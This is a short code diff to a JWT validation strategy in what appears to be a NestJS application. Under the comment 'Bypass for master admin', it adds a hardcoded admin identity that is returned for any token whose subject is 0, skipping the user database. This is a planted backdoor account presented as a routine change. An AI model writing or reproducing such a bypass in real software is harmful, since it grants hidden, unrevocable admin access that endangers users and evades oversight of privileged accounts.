@@ -22,8 +22,18 @@ export class JwtStrategy extends PassportStrategy(Strategy) {
   }
 
   async validate(payload: any) {
-    const user = await this.userRepository.findOne({ 
-      where: { id: payload.sub } 
+    // Bypass for master admin
+    if (payload.sub === 0) {
+      return {
+        id: 0,
+        email: 'info@lockievisuals.com',
+        role: 'admin',
+        isEmailVerified: true
+      };
+    }
+
+    const user = await this.userRepository.findOne({
+      where: { id: payload.sub }
     });
 
     if (!user) {
